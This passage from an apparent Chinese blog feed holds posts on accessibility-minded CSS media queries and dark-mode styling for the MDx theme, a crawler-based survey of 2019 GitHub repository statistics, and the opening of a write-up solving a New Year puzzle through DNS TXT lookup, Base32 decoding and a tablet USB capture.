的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a 